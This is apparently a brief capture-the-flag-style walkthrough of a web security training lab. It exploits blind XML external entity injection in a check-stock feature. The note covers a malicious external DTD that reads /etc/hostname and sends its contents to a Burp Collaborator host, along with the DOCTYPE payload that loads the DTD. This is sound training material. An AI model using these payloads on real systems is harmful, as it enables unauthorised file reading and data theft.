# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

Open Burp Collaborator and copy the subdomain: `uomhe13rt0bmbq6o3u87qszbx23srh.burpcollaborator.net`

Open the exploit server and place the following into the body of the dtd:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://uomhe13rt0bmbq6o3u87qszbx23srh.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

Copy the url of the dtd. Intercept a request for the check stock function and place the url into the definition, using the full definition in the request xml:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-ac8c1f401e928e56c0e0a20901a400e5.web-security-academy.net/exploit.dtd"> %xxe;]>`

Forward the request and check the collaborator logs. The http interaction will show a request similar to `GET /x=p35g342isk21` where `x=%file;` as defined in the malicious dtd.

Submit the solution to solve the lab.